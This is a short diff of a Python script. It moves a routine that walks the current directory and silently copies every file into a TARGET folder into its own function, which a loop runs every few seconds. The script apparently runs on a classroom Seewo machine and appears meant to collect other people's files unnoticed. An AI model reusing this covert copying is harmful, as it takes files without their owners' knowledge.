@@ -82,13 +82,8 @@ def openfile(filename:str):
         elif file_suffix in ('pdf',):
             threading.Thread(target=lambda:os.system(fr'start C:\Users\SEEWO\AppData\Roaming\secoresdk\360se6\Application\360se {filename}')).start()
             shutil.copy(filename,os.path.join(TARGET,filename.split(os.sep)[-1]))
-
-def main():
-    execute_with_arg()
-    print(f'已于 {time.strftime("%Y.%m.%d %H:%M:%S")} 启动')
-    while True:
-        if is_file_number_change():
-            filelst = os.walk('.')
+def copy(path:str): #!缩进
+            filelst = os.walk(path)
             for i in filelst:
                 for j in i[2]:
                     filename = os.path.join(i[0],j)
@@ -96,6 +91,13 @@ def main():
                         target = os.path.join(TARGET,j)
                         shutil.copy(filename,target)
                         print(f'已复制 {filename} at {time.strftime("%Y.%m.%d %H:%M:%S")}')
+
+def main():
+    execute_with_arg()
+    print(f'已于 {time.strftime("%Y.%m.%d %H:%M:%S")} 启动')
+    while True:
+        if is_file_number_change():
+            copy('.')
         time.sleep(5)
 
 if __name__ == '__main__':
